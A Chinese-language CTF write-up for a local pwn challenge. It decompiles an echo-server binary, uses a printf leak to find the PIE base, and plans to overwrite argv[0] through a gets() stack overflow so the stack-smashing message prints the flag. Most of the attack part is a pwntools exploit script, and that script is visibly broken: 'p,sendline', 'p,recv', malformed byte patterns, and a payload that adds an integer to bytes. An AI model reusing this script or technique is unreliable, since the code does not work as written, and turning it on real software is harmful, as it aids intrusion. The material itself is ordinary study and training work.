第一步，我们通过我们检查我们的保护措施
![[Pasted image 20240203102545.png]]
发现我们的保护全开

第二步：使用 IDA 查看我们的源代码:
```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  bool v3; // zf
  __int64 v4; // rcx
  char *v5; // rsi
  const char *v6; // rdi
  char v8[16]; // [rsp+0h] [rbp-A8h] BYREF
  __int64 (__fastcall *v9)(); // [rsp+10h] [rbp-98h]
  char v10[104]; // [rsp+20h] [rbp-88h] BYREF
  unsigned __int64 v11; // [rsp+88h] [rbp-20h]

  v11 = __readfsqword(0x28u);
  sub_DA0(a1, a2, a3);
  sub_F40();
  v9 = sub_CF0;
  puts("Hi~ This is a very easy echo server.");
  puts("Please give me your name~");
  _printf_chk(1LL, "Name: ");
  sub_E40(v8);
  _printf_chk(1LL, "Welcome %s into the server!\n", v8);
  do
  {
    while ( 1 )
    {
      _printf_chk(1LL, "Input: ");
      gets(v10);
      _printf_chk(1LL, "Output: %s\n\n", v10);
      v4 = 9LL;
      v5 = v10;
      v6 = "backdoor";
      do
      {
        if ( !v4 )
          break;
        v3 = *v5++ == *v6++;
        --v4;
      }
      while ( v3 );
      if ( !v3 )
        break;
      ((void (__fastcall *)(const char *, char *))v9)(v6, v5);
    }
  }
  while ( strcmp(v10, "exitexit") );
  puts("See you next time~");
  return 0LL;
}
```

我们发现，我们存在一个读入 `v8`,和一个读入 `v10`，其中读入 `v8` 的有点神奇，大概就是写什么就读什么，但是读入 `v10` 的明显存在一个栈溢出漏洞。我们考虑怎么利用这个漏洞来泄露我们需要的信息。

观察到，我们的第二个 printf 可以泄露我们的信息，
![[Pasted image 20240203103350.png]]

我们可以观察一下他泄露了什么信息。我们发现，我们泄露的信息是我们的某一个栈上的一个类似于函数地址的玩意儿，如下所示：(0x55c20cc68cf0）

我们于是可以通过我们的这一个地址和我们的内存机制进行比较后求出我们的内存的地址是多少。这里，我们需要通过我们的 `vmmap` 来进行查询。
![[Pasted image 20240203135805.png]]

之后，我们就能得到我们的偏移量就是我们的 `cf0`,于是我们就得到了我们的基地址。

接下来，我们的目标就是获得我们 flag 的存放位置在哪里，这里，我们可以通过执行我们的函数后动态调试获得。
![[Pasted image 20240203141547.png]]

我们得到了我们的一个 flag 的地址，然后又已知了我们的基址，我们就可以求出我们 flag 的地址。或者我们也可以通过我们的对应函数得到：
![[Pasted image 20240203142751.png]]


接下来我们就要找到我们的 agrv 0 参数。这里，因为我们是采用我们的 `stack_checkstack`
```cpp
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

接下来，我们的工作就是找到 `argv[0]` 对应的位置，修改为我们的 flag 即可。

```python
from pwn import *

from struct import pack

from ctypes import *

import base64

from LibcSearcher import *

def debug(c=0):

    if(c):

        gdb.attach(p,c)

    else:

        gdb.attach(p)

        pause()

def get_sb() :return libc_base+libc_sym['system'],libc_base+next(libc.search(b'/bin/sh\x00'))

  

#-----------------------------------------------------------------

s=lambda data : p.send(data)

sa=lambda text,data :p.sendafter(text, data)

sl=lambda data :p,sendline(data)

sla = lambda text,data :p.sendlineafter(text, data)

r = lambda num=4696:p.recv(num)

rl = lambda text :p.recvuntil(text)

pr = lambda num=4096 :print(p,recv(num))

inter= lambda :p.interactive()

l32=lambda :u32(p.recvuntil(b'(xf7')[-4:].ljust(4,b'\x00'))

l64=lambda :u64(p.recvuntil(b'(x7f')[-6:],ljust(8,b'\x00'))

uu32 =lambda:u32(p,recv(4),ljust(4,b'\x00'))

uu64 =lambda:u64(p.recv(6).ljust(8,b'\x00'))

int16 = lambda data :int(data,16)

lg =lambda s,num :p.success("%s ->0x%x" %(s,num))

  

#--------------------------------------------------------------

  

p=process('./pwn')

elf=ELF('./pwn')

libc=ELF('./lib/x86_64-linux-gnu/libc.so.6')

sa(b'name ',b'a'*0x10)
rl(b'a'*0x10)
pro_base=uu64()-0xcf0
sa(b'Input:',b'backdoor\x00')
payload=pro_base+0x202040
sa(b'Input',b'a'*0x168+payload)
sa(b'Input',b'exitexit\x00')
rl()
inter()
```